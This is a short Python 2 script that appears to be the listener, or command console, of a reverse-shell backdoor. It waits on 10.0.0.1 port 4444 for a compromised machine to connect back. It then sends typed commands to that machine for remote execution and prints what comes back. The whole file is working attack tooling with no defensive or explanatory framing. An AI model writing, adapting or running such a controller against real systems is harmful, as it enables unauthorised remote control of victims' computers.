#! /usr/bin/env python
import socket, json

# TCP Client.
tcpServer = ""
ip = "10.0.0.1"
port = 4444


class Listener:
    def __init__(self, ip, port):
        listener = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        listener.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        listener.bind((ip, port))
        listener.listen(0)
        print("[+] Listening...")
        self.connection, address = listener.accept()
        print("Received a connection from " + str(address))

    def reliable_send(self, data):
        json_data = json.dumps(data.decode("utf-8"))
        self.connection.send(json_data)

    def reliable_receive(self):
        json_data = ""
        while True:
            try:
                json_data = json_data + self.connection.recv(1024)
                return json.loads(json_data)
            except ValueError:
                continue
    def execute_remotely(self,command):
        self.reliable_send(command)
        return self.reliable_receive()

    def run(self):
        while True:
            command = raw_input(">> ")
            result = self.execute_remotely(command)
            print(result)

listener = Listener(ip, port)
listener.run()
